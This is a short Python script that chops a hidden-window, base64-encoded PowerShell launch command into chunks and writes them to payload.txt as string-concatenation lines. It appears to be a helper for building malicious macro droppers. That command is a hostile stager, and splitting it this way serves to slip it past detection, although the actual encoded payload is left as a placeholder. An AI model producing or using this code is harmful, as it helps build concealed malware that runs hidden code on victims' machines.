str = "powershell.exe -nop -w hidden -e $base64"
n=50
for i in range(0,len(str),n):
   with open("payload.txt", "a") as f:
      f.write("Str = str+" + '"' + str[i:i+n] +'"\n')
      #Add a new line
   # py write to file
